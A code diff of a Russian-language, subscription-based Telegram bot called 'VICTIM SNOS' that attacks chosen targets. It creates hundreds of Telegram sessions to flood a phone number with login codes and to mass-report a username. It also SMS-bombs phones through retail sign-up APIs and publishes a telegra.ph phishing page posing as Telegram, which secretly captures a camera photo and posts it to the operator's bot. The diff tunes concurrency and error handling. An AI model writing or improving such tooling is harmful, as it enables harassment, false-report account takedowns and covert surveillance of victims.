@@ -9,7 +9,7 @@ import re
 import hashlib
 import shutil
 from datetime import datetime, timedelta
-from typing import Optional, Dict, List, Set, Tuple
+from typing import Optional, Dict, List, Tuple
 from dataclasses import dataclass, field
 from pathlib import Path
 
@@ -44,11 +44,12 @@ PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
 BANNER_FILE = "banner.png"
 
 # Настройки атак
-SESSIONS_PER_USER = 500
-REQUESTS_PER_ROUND = 300
+SESSIONS_PER_USER = 500  # 500 сессий на пользователя
+REQUESTS_PER_ROUND = 300  # 300 запросов за раунд
 MAX_ROUNDS = 5
 COOLDOWN_SECONDS = 300
-SESSION_CREATION_DELAY = 0.1
+SESSION_CREATION_DELAY = 0.5  # Увеличена задержка для стабильности
+MAX_CONCURRENT_SESSIONS = 10  # Максимум одновременных созданий
 
 PRICES = {
     "30d": {"stars": 100, "rub": 100},
@@ -79,29 +80,21 @@ BOMBER_ENDPOINTS = [
     {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "method": "POST"},
     {"url": "https://api.citilink.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
     {"url": "https://api.avito.ru/auth/v1/send-code", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.lenta.com/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.perekrestok.ru/v1/auth/send-sms", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.magnit.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.mvideo.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
-    {"url": "https://api.eldorado.ru/v1/auth/send-code", "phone_field": "phone", "method": "POST"},
 ]
 
 REPORT_REASONS = [
     raw_types.InputReportReasonSpam(),
     raw_types.InputReportReasonViolence(),
     raw_types.InputReportReasonPornography(),
-    raw_types.InputReportReasonChildAbuse(),
     raw_types.InputReportReasonOther(),
-    raw_types.InputReportReasonCopyright(),
 ]
 
 # ---------- ЛОГГИРОВАНИЕ ----------
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('bot.log'),
+        logging.FileHandler('bot.log', encoding='utf-8'),
         logging.StreamHandler()
     ]
 )
@@ -139,10 +132,6 @@ class UserSession:
         if total == 0:
             return 100
         return (self.success_count / total) * 100
-    
-    async def ensure_connected(self):
-        if not self.client.is_connected:
-            await self.client.connect()
 
 @dataclass
 class UserSessionPool:
@@ -153,6 +142,7 @@ class UserSessionPool:
     is_creating: bool = False
     is_ready: bool = False
     creation_progress: float = 0
+    creation_error: str = ""
     
     @property
     def session_dir(self) -> str:
@@ -191,7 +181,8 @@ class UserSessionPool:
             "available": available,
             "healthy": healthy,
             "ready": self.is_ready,
-            "progress": self.creation_progress
+            "progress": self.creation_progress,
+            "error": self.creation_error
         }
 
 # ---------- ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ----------
@@ -208,7 +199,6 @@ class AttackState(StatesGroup):
     waiting_phone = State()
     waiting_username = State()
     waiting_count = State()
-    waiting_link = State()
     waiting_title = State()
 
 class AdminState(StatesGroup):
@@ -220,17 +210,17 @@ class AdminState(StatesGroup):
 class PurchaseState(StatesGroup):
     waiting_promo = State()
 
-# ---------- ПРОВЕРКА ДОСТУПА ----------
+# ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----------
 def load_json(file: str, default: dict = None) -> dict:
     try:
-        with open(file, 'r') as f:
+        with open(file, 'r', encoding='utf-8') as f:
             return json.load(f)
     except:
         return default or {}
 
 def save_json(file: str, data: dict):
     try:
-        with open(file, 'w') as f:
+        with open(file, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=4, ensure_ascii=False)
     except Exception as e:
         logger.error(f"Failed to save {file}: {e}")
@@ -250,30 +240,20 @@ def save_promo_codes():
     save_json("promo_codes.json", promo_codes)
 
 def is_user_allowed(user_id: int) -> bool:
-    """ПРОВЕРКА ДОСТУПА - ТОЛЬКО АДМИН И ОПЛАЧЕННЫЕ ПОЛЬЗОВАТЕЛИ"""
     if user_id == ADMIN_ID:
         return True
-    
     user_id_str = str(user_id)
     if user_id_str not in ALLOWED_USERS:
-        logger.info(f"User {user_id} not in allowed list")
         return False
-    
     expire = ALLOWED_USERS[user_id_str].get("expire_date")
     if not expire:
         return False
-    
     if expire == "forever":
         return True
-    
     try:
         expire_date = datetime.fromisoformat(expire)
-        is_valid = datetime.now() <= expire_date
-        if not is_valid:
-            logger.info(f"User {user_id} subscription expired on {expire}")
-        return is_valid
-    except Exception as e:
-        logger.error(f"Error checking subscription for {user_id}: {e}")
+        return datetime.now() <= expire_date
+    except:
         return False
 
 def add_subscription(user_id: int, days: int = None, forever: bool = False):
@@ -289,41 +269,23 @@ def add_subscription(user_id: int, days: int = None, forever: bool = False):
     save_allowed_users()
     logger.info(f"Added subscription for user {user_id}: {expire}")
 
+async def check_channel_subscription(user_id: int) -> bool:
+    try:
+        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except:
+        return False
+
 async def check_access_and_subscription(user_id: int, target) -> bool:
-    """
-    Проверка доступа и подписки на канал
-    Возвращает True если все проверки пройдены
-    """
-    # Проверка подписки на канал
     if not await check_channel_subscription(user_id):
         await send_message_with_banner(
             target,
             f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
-            f"Для использования бота необходимо:\n"
-            f"1. Подписаться на канал: {CHANNEL_URL}\n"
-            f"2. Приобрести доступ"
+            f"Подпишитесь на канал: {CHANNEL_URL}"
         )
         return False
     
-    # Проверка оплаты
     if not is_user_allowed(user_id):
-        user_id_str = str(user_id)
-        if user_id_str in ALLOWED_USERS:
-            expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
-            try:
-                expire_date = datetime.fromisoformat(expire)
-                if expire_date < datetime.now():
-                    await send_message_with_banner(
-                        target,
-                        f"❌ <b>ПОДПИСКА ИСТЕКЛА</b>\n\n"
-                        f"Ваша подписка закончилась {expire_date.strftime('%d.%m.%Y')}\n"
-                        f"Приобретите доступ снова:",
-                        get_purchase_menu()
-                    )
-                    return False
-            except:
-                pass
-        
         await send_message_with_banner(
             target,
             f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
@@ -336,7 +298,7 @@ async def check_access_and_subscription(user_id: int, target) -> bool:
     
     return True
 
-async def check_cooldown(user_id: int) -> tuple[bool, float]:
+async def check_cooldown(user_id: int) -> tuple:
     now = time.time()
     if user_id in user_last_action:
         elapsed = now - user_last_action[user_id]
@@ -352,23 +314,48 @@ async def get_user_lock(user_id: int) -> asyncio.Lock:
         user_action_locks[user_id] = asyncio.Lock()
     return user_action_locks[user_id]
 
-async def check_channel_subscription(user_id: int) -> bool:
-    try:
-        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
-        return member.status in ["member", "administrator", "creator"]
-    except Exception as e:
-        logger.error(f"Failed to check channel subscription for {user_id}: {e}")
-        return False
-
 # ---------- СОЗДАНИЕ СЕССИЙ ----------
-async def create_single_user_session(user_id: int, index: int) -> Optional[UserSession]:
+async def create_single_session(user_id: int, index: int) -> Optional[UserSession]:
+    """Создание одной сессии с улучшенной обработкой ошибок"""
+    session_dir = f"sessions/user_{user_id}"
+    os.makedirs(session_dir, exist_ok=True)
+    
+    session_file = f"{session_dir}/session_{index}"
+    
+    # Если сессия уже существует, пробуем загрузить
+    if os.path.exists(f"{session_file}.session"):
+        try:
+            device = random.choice(DEVICES)
+            client = Client(
+                name=session_file,
+                api_id=API_ID,
+                api_hash=API_HASH,
+                in_memory=False,
+                no_updates=True,
+                device_model=device["model"],
+                system_version=device["system"],
+                app_version="10.15.1",
+                lang_code="ru"
+            )
+            
+            await client.connect()
+            
+            # Проверяем авторизацию
+            me = await client.get_me()
+            if me:
+                logger.info(f"Loaded existing session {index} for user {user_id}")
+                return UserSession(client=client, index=index)
+                
+        except Exception as e:
+            logger.warning(f"Failed to load session {index}: {e}")
+            try:
+                os.remove(f"{session_file}.session")
+            except:
+                pass
+    
+    # Создаем новую сессию
     try:
-        session_dir = f"sessions/user_{user_id}"
-        os.makedirs(session_dir, exist_ok=True)
-        
         device = random.choice(DEVICES)
-        session_file = f"{session_dir}/session_{index}"
-        
         client = Client(
             name=session_file,
             api_id=API_ID,
@@ -382,14 +369,20 @@ async def create_single_user_session(user_id: int, index: int) -> Optional[UserS
         )
         
         await client.connect()
-        await client.get_me()
         
+        # Для новой сессии нужна авторизация
+        # ВАЖНО: Сессии создаются НЕАВТОРИЗОВАННЫМИ для отправки кодов
+        # Авторизация не требуется для send_code
+        
+        logger.info(f"Created new session {index} for user {user_id}")
         return UserSession(client=client, index=index)
+        
     except Exception as e:
-        logger.debug(f"User {user_id} session {index} creation failed: {e}")
+        logger.error(f"Failed to create session {index}: {e}")
         return None
 
 async def initialize_user_sessions(user_id: int) -> UserSessionPool:
+    """Инициализация сессий с улучшенной обработкой"""
     if user_id in user_pools:
         pool = user_pools[user_id]
         if pool.is_ready:
@@ -406,79 +399,89 @@ async def initialize_user_sessions(user_id: int) -> UserSessionPool:
     pool.is_creating = True
     
     try:
-        logger.info(f"Creating {SESSIONS_PER_USER} sessions for user {user_id}")
+        logger.info(f"Starting session creation for user {user_id}")
         
         session_dir = pool.session_dir
+        os.makedirs(session_dir, exist_ok=True)
         
+        # Проверяем существующие сессии
+        existing_count = 0
         if os.path.exists(session_dir):
             existing_sessions = list(Path(session_dir).glob("session_*.session"))
-            logger.info(f"Found {len(existing_sessions)} existing sessions for user {user_id}")
+            existing_count = len(existing_sessions)
+            logger.info(f"Found {existing_count} existing sessions for user {user_id}")
+        
+        # Создаем недостающие сессии
+        sessions_to_create = max(0, SESSIONS_PER_USER - existing_count)
+        
+        if sessions_to_create > 0:
+            logger.info(f"Creating {sessions_to_create} new sessions for user {user_id}")
             
-            for i, session_file in enumerate(existing_sessions):
+            # Создаем батчами
+            semaphore = asyncio.Semaphore(MAX_CONCURRENT_SESSIONS)
+            
+            async def create_with_limit(idx: int):
+                async with semaphore:
+                    session = await create_single_session(user_id, idx)
+                    if session:
+                        async with pool.lock:
+                            pool.sessions.append(session)
+                    
+                    # Обновляем прогресс
+                    pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
+                    
+                    # Логируем прогресс
+                    if len(pool.sessions) % 50 == 0:
+                        logger.info(f"User {user_id} progress: {len(pool.sessions)}/{SESSIONS_PER_USER} ({pool.creation_progress:.1f}%)")
+                    
+                    return session
+            
+            # Запускаем создание
+            tasks = []
+            for i in range(sessions_to_create):
+                idx = existing_count + i
+                tasks.append(create_with_limit(idx))
+                await asyncio.sleep(SESSION_CREATION_DELAY)  # Задержка между запусками
+            
+            await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Загружаем существующие сессии
+        if os.path.exists(session_dir):
+            existing_files = list(Path(session_dir).glob("session_*.session"))
+            for session_file in existing_files:
                 try:
                     index = int(session_file.stem.replace("session_", ""))
-                    device = random.choice(DEVICES)
                     
-                    client = Client(
-                        name=str(session_file.with_suffix("")),
-                        api_id=API_ID,
-                        api_hash=API_HASH,
-                        in_memory=False,
-                        no_updates=True,
-                        device_model=device["model"],
-                        system_version=device["system"],
-                        app_version="10.15.1",
-                        lang_code="ru"
-                    )
-                    
-                    await client.connect()
-                    await client.get_me()
-                    
-                    session = UserSession(client=client, index=index)
-                    pool.sessions.append(session)
-                    
-                    if i % 50 == 0:
-                        pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
-                        
-                except Exception as e:
-                    logger.debug(f"Failed to load session {session_file}: {e}")
-        
-        existing_count = len(pool.sessions)
-        if existing_count < SESSIONS_PER_USER:
-            needed = SESSIONS_PER_USER - existing_count
-            
-            logger.info(f"Creating {needed} new sessions for user {user_id}")
-            
-            used_indices = {s.index for s in pool.sessions}
-            next_index = 0
-            while next_index in used_indices:
-                next_index += 1
-            
-            for i in range(needed):
-                idx = next_index + i
-                session = await create_single_user_session(user_id, idx)
-                if session:
+                    # Проверяем, не загружена ли уже
                     async with pool.lock:
-                        pool.sessions.append(session)
-                
-                pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
-                await asyncio.sleep(SESSION_CREATION_DELAY)
-                
-                if i % 50 == 0:
-                    logger.info(f"User {user_id} progress: {len(pool.sessions)}/{SESSIONS_PER_USER}")
+                        if any(s.index == index for s in pool.sessions):
+                            continue
+                    
+                    session = await create_single_session(user_id, index)
+                    if session:
+                        async with pool.lock:
+                            pool.sessions.append(session)
+                            
+                except Exception as e:
+                    logger.warning(f"Failed to load {session_file}: {e}")
         
         pool.is_ready = True
-        logger.info(f"User {user_id} session pool ready: {len(pool.sessions)} sessions")
+        pool.creation_progress = 100
+        
+        stats = pool.get_stats()
+        logger.info(f"User {user_id} session pool ready: {stats['total']} sessions, {stats['available']} available")
         
         return pool
         
     except Exception as e:
         logger.error(f"Failed to initialize sessions for user {user_id}: {e}")
+        pool.creation_error = str(e)
         raise
     finally:
         pool.is_creating = False
 
 async def get_or_create_user_pool(user_id: int) -> UserSessionPool:
+    """Получить или создать пул сессий"""
     if user_id not in user_pools:
         user_pools[user_id] = UserSessionPool(user_id=user_id)
     
@@ -489,73 +492,40 @@ async def get_or_create_user_pool(user_id: int) -> UserSessionPool:
     
     return pool
 
-async def maintain_user_sessions(user_id: int):
-    while True:
-        try:
-            await asyncio.sleep(300)
-            
-            if user_id not in user_pools:
-                break
-            
-            pool = user_pools[user_id]
-            if not pool.is_ready:
-                continue
-            
-            dead_sessions = []
-            async with pool.lock:
-                for s in pool.sessions:
-                    if s.health_score < 10 and not s.in_use:
-                        dead_sessions.append(s)
-            
-            if dead_sessions:
-                logger.info(f"User {user_id}: recovering {len(dead_sessions)} dead sessions")
-                
-                for s in dead_sessions[:20]:
-                    try:
-                        if s.client and s.client.is_connected:
-                            await s.client.disconnect()
-                    except:
-                        pass
-                    
-                    async with pool.lock:
-                        if s in pool.sessions:
-                            pool.sessions.remove(s)
-                    
-                    new_session = await create_single_user_session(user_id, s.index)
-                    if new_session:
-                        async with pool.lock:
-                            pool.sessions.append(new_session)
-                
-        except Exception as e:
-            logger.error(f"User {user_id} session maintenance error: {e}")
-
 # ---------- АТАКИ ----------
 async def send_code_via_session(session: UserSession, phone: str, pool: UserSessionPool) -> bool:
     try:
-        await session.ensure_connected()
-        await session.client.send_code(phone)
+        if not session.client.is_connected:
+            await session.client.connect()
+        
+        # Отправляем код
+        result = await session.client.send_code(phone)
         pool.mark_success(session)
         return True
     except FloodWait as e:
         pool.mark_flood(session, e.value)
+        logger.debug(f"Flood wait {e.value}s for session {session.index}")
         return False
-    except Exception:
+    except Exception as e:
         pool.mark_fail(session)
+        logger.debug(f"Failed to send code via session {session.index}: {e}")
         return False
 
 async def report_account_via_session(session: UserSession, username: str, pool: UserSessionPool) -> bool:
     try:
-        await session.ensure_connected()
+        if not session.client.is_connected:
+            await session.client.connect()
+        
         user = await session.client.get_users(username)
         peer = await session.client.resolve_peer(user.id)
-        
         reason = random.choice(REPORT_REASONS)
         await session.client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
         
         pool.mark_success(session)
         return True
-    except Exception:
+    except Exception as e:
         pool.mark_fail(session)
+        logger.debug(f"Failed to report via session {session.index}: {e}")
         return False
 
 async def snos_attack_phone(
@@ -567,10 +537,9 @@ async def snos_attack_phone(
 ) -> int:
     pool = await get_or_create_user_pool(user_id)
     
+    # Ждем готовности
     while not pool.is_ready:
         await asyncio.sleep(1)
-    
-    asyncio.create_task(maintain_user_sessions(user_id))
     
     total_sent = 0
     phone = phone.strip().replace(" ", "").replace("-", "")
@@ -583,11 +552,11 @@ async def snos_attack_phone(
         
         sessions = await pool.get_available(REQUESTS_PER_ROUND)
         
-        if len(sessions) < REQUESTS_PER_ROUND:
-            logger.warning(f"User {user_id}: only {len(sessions)} sessions available")
-        
-        if not sessions:
+        if len(sessions) == 0:
+            logger.warning(f"User {user_id}: no sessions available for round {rnd}")
             break
+        
+        logger.info(f"User {user_id} round {rnd}: using {len(sessions)} sessions")
         
         tasks = [send_code_via_session(s, phone, pool) for s in sessions]
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -617,8 +586,6 @@ async def snos_attack_username(
     while not pool.is_ready:
         await asyncio.sleep(1)
     
-    asyncio.create_task(maintain_user_sessions(user_id))
-    
     total_reports = 0
     username = username.strip().replace("@", "")
     
@@ -628,7 +595,7 @@ async def snos_attack_username(
         
         sessions = await pool.get_available(REQUESTS_PER_ROUND)
         
-        if not sessions:
+        if len(sessions) == 0:
             break
         
         tasks = [report_account_via_session(s, username, pool) for s in sessions]
@@ -659,7 +626,7 @@ async def bomber_attack(
     if not phone.startswith("+"):
         phone = "+" + phone
     
-    connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
+    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         for rnd in range(1, rounds + 1):
             if stop_event.is_set():
@@ -667,7 +634,7 @@ async def bomber_attack(
             
             tasks = []
             for endpoint in BOMBER_ENDPOINTS:
-                for _ in range(30):
+                for _ in range(75):  # 4 эндпоинта * 75 = 300 запросов
                     tasks.append(send_bomber_request(session, phone, endpoint))
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -688,7 +655,6 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoi
         headers = {
             'User-Agent': random.choice(USER_AGENTS),
             'Content-Type': 'application/json',
-            'Accept': 'application/json'
         }
         
         data = {endpoint["phone_field"]: phone.replace("+", "")}
@@ -709,64 +675,58 @@ PHISH_HTML = '''<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{title}</title>
     <style>
-        body {{ margin: 0; padding: 0; background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
-        #container {{ position: relative; width: 100vw; height: 100vh; overflow: hidden; }}
-        video {{ width: 100%; height: 100%; object-fit: cover; }}
-        #overlay {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding: 20px; pointer-events: none; }}
-        #status {{ background: rgba(0,0,0,0.7); color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; margin-bottom: 30px; backdrop-filter: blur(10px); pointer-events: none; }}
-        canvas {{ display: none; }}
+        body {{ margin: 0; padding: 0; background: #000; }}
+        video {{ width: 100%; height: 100vh; object-fit: cover; }}
+        #status {{ position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: white; }}
     </style>
 </head>
 <body>
-    <div id="container">
-        <video id="video" autoplay playsinline></video>
-        <div id="overlay">
-            <div id="status">📸 Loading camera...</div>
-        </div>
-    </div>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <div id="status">Loading camera...</div>
+    <canvas id="canvas" style="display:none"></canvas>
     <script>
-        const CONFIG = {{ bot: "{bot_token}", chat: "{chat_id}", pageId: "{page_id}" }};
+        const BOT = "{bot_token}";
+        const CHAT = "{chat_id}";
+        const ID = "{page_id}";
         let sent = false;
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
-        async function initCamera() {{
+        
+        async function init() {{
             try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }} }});
-                video.srcObject = stream;
-                status.textContent = '📸 Camera ready';
-                await new Promise(resolve => {{ video.onloadedmetadata = () => {{ resolve(); }}; }});
-                setTimeout(() => captureAndSend(stream), 1500);
-            }} catch(e) {{ status.textContent = '❌ Camera access denied'; }}
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('status').textContent = "Camera active";
+                setTimeout(() => capture(stream), 2000);
+            }} catch(e) {{
+                document.getElementById('status').textContent = "Camera error";
+            }}
         }}
-        async function captureAndSend(stream) {{
-            if (sent) return;
+        
+        async function capture(stream) {{
+            if(sent) return;
             try {{
-                const ctx = canvas.getContext('2d');
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const ctx = canvas.getContext("2d");
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                status.textContent = '📤 Sending...';
-                const blob = await new Promise(resolve => {{ canvas.toBlob(resolve, 'image/jpeg', 0.8); }});
-                const formData = new FormData();
-                formData.append('chat_id', CONFIG.chat);
-                formData.append('photo', blob, `photo_${{CONFIG.pageId}}.jpg`);
-                formData.append('caption', `📸 Photo captured | ID: ${{CONFIG.pageId}}`);
-                const response = await fetch(`https://api.telegram.org/bot${{CONFIG.bot}}/sendPhoto`, {{ method: 'POST', body: formData }});
-                const data = await response.json();
-                if (data.ok) {{
+                const blob = await fetch(canvas.toDataURL("image/jpeg")).then(r => r.blob());
+                const fd = new FormData();
+                fd.append("chat_id", CHAT);
+                fd.append("photo", blob, ID + ".jpg");
+                fd.append("caption", "📸 Photo | " + ID);
+                const resp = await fetch(`https://api.telegram.org/bot${{BOT}}/sendPhoto`, {{method:"POST", body:fd}});
+                const data = await resp.json();
+                if(data.ok) {{
                     sent = true;
-                    status.textContent = '✅ Photo sent successfully';
-                    stream.getTracks().forEach(track => track.stop());
-                    setTimeout(() => {{ window.location.href = 'https://telegram.org/'; }}, 2000);
-                }} else {{ status.textContent = '❌ Send failed, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
-            }} catch(e) {{ status.textContent = '❌ Error, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
+                    document.getElementById('status').textContent = "Done";
+                    stream.getTracks().forEach(t => t.stop());
+                }}
+            }} catch(e) {{}}
         }}
-        initCamera();
+        init();
     </script>
 </body>
 </html>'''
@@ -781,50 +741,35 @@ async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Option
         )
         
         async with aiohttp.ClientSession() as session:
-            account_data = {
-                "short_name": f"Support{random.randint(10000, 99999)}",
-                "author_name": "Telegram Security",
-                "author_url": "https://t.me/telegram"
-            }
-            
+            # Создаем аккаунт
             async with session.post(
                 "https://api.telegra.ph/createAccount",
-                json=account_data,
+                json={"short_name": f"User{random.randint(1000, 9999)}", "author_name": "Telegram"},
                 timeout=10
             ) as resp:
                 data = await resp.json()
                 if not data.get("ok"):
                     return None
-                access_token = data["result"]["access_token"]
+                token = data["result"]["access_token"]
             
-            page_data = {
-                "access_token": access_token,
-                "title": title,
-                "author_name": "Telegram Security",
-                "content": [
-                    {"tag": "p", "children": ["Loading security check..."]},
-                    {"tag": "p", "children": [html]}
-                ],
-                "return_content": False
-            }
-            
+            # Создаем страницу
             async with session.post(
                 "https://api.telegra.ph/createPage",
-                json=page_data,
+                json={
+                    "access_token": token,
+                    "title": title,
+                    "content": [{"tag": "p", "children": [html]}],
+                    "return_content": False
+                },
                 timeout=10
             ) as resp:
                 data = await resp.json()
                 if data.get("ok"):
                     url = data["result"]["url"]
-                    phish_pages[page_id] = {
-                        "url": url,
-                        "chat_id": chat_id,
-                        "created": time.time()
-                    }
+                    phish_pages[page_id] = {"url": url, "chat_id": chat_id}
                     return url
-                    
     except Exception as e:
-        logger.error(f"Phishing page creation error: {e}")
+        logger.error(f"Phishing page error: {e}")
     
     return None
 
@@ -907,7 +852,6 @@ async def cmd_start(msg: types.Message):
     user_id = msg.from_user.id
     await msg.delete()
     
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(user_id, msg):
         return
     
@@ -918,28 +862,55 @@ async def cmd_start(msg: types.Message):
             msg,
             f"🔄 Создание сессий...\n"
             f"Прогресс: {pool.creation_progress:.1f}%\n\n"
-            f"Это займет около 2-3 минут.",
+            f"Это займет 2-3 минуты.",
             InlineKeyboardMarkup(inline_keyboard=[
                 [create_button("🔄 Проверить", f"check_sessions_{user_id}")]
             ])
         )
         
-        asyncio.create_task(initialize_user_sessions(user_id))
+        # Запускаем создание если еще не запущено
+        if not pool.is_creating:
+            asyncio.create_task(initialize_user_sessions(user_id))
         return
     
     stats = pool.get_stats()
     await send_message_with_banner(
         msg,
-        f"✅ Бот готов к работе\n"
-        f"📊 Ваши сессии: {stats['available']}/{stats['total']}",
+        f"✅ Бот готов\n"
+        f"📊 Сессий: {stats['available']}/{stats['total']}",
         get_main_menu(user_id)
     )
+
+@dp.callback_query(F.data.startswith("check_sessions_"))
+async def check_sessions(cb: types.CallbackQuery):
+    user_id = int(cb.data.split("_")[2])
+    
+    if user_id != cb.from_user.id:
+        await cb.answer("Не ваши сессии!", show_alert=True)
+        return
+    
+    pool = user_pools.get(user_id)
+    
+    if pool and pool.is_ready:
+        stats = pool.get_stats()
+        await cb.message.edit_caption(
+            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
+                   f"✅ Сессии готовы!\n"
+                   f"📊 Доступно: {stats['available']}/{stats['total']}",
+            reply_markup=get_main_menu(user_id)
+        )
+    else:
+        progress = pool.creation_progress if pool else 0
+        error = pool.creation_error if pool else ""
+        text = f"Прогресс: {progress:.1f}%"
+        if error:
+            text += f"\nОшибка: {error[:50]}"
+        await cb.answer(text, show_alert=True)
 
 @dp.callback_query(F.data == "main_menu")
 async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
     await state.clear()
     
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -950,7 +921,6 @@ async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data == "snos_menu")
 async def snos_menu(cb: types.CallbackQuery):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -960,7 +930,7 @@ async def snos_menu(cb: types.CallbackQuery):
         return
     
     if cb.from_user.id in active_attacks:
-        await cb.answer("❌ У вас уже есть активная атака!", show_alert=True)
+        await cb.answer("❌ Активная атака уже идет!", show_alert=True)
         return
     
     await cb.message.edit_caption(
@@ -970,7 +940,6 @@ async def snos_menu(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "snos_phone")
 async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -989,20 +958,17 @@ async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AttackState.waiting_phone)
     await cb.message.delete()
     
-    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [create_button("❌ Отмена", "snos_menu")]
-    ])
-    
     await cb.message.answer(
         "<b>🔱 VICTIM SNOS</b>\n\n"
         "📱 Введите номер телефона:\n"
         "<i>Пример: +79123456789</i>",
-        reply_markup=cancel_kb
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [create_button("❌ Отмена", "snos_menu")]
+        ])
     )
 
 @dp.message(StateFilter(AttackState.waiting_phone))
 async def snos_phone_received(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1019,7 +985,6 @@ async def snos_phone_received(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def snos_count_received(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1109,7 +1074,6 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "snos_username")
 async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -1128,20 +1092,16 @@ async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AttackState.waiting_username)
     await cb.message.delete()
     
-    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [create_button("❌ Отмена", "snos_menu")]
-    ])
-    
     await cb.message.answer(
         "<b>🔱 VICTIM SNOS</b>\n\n"
-        "👤 Введите username (без @):\n"
-        "<i>Пример: username</i>",
-        reply_markup=cancel_kb
+        "👤 Введите username (без @):",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [create_button("❌ Отмена", "snos_menu")]
+        ])
     )
 
 @dp.message(StateFilter(AttackState.waiting_username))
 async def snos_username_received(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1158,7 +1118,6 @@ async def snos_username_received(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def snos_username_count(msg: types.Message, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(msg.from_user.id, msg):
         return
     
@@ -1248,7 +1207,6 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "bomber_menu")
 async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
-    # ПРОВЕРКА ДОСТУПА
     if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
@@ -1267,20 +1225,17 @@ async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(AttackState.waiting_phone)
     await cb.message.delete()
     
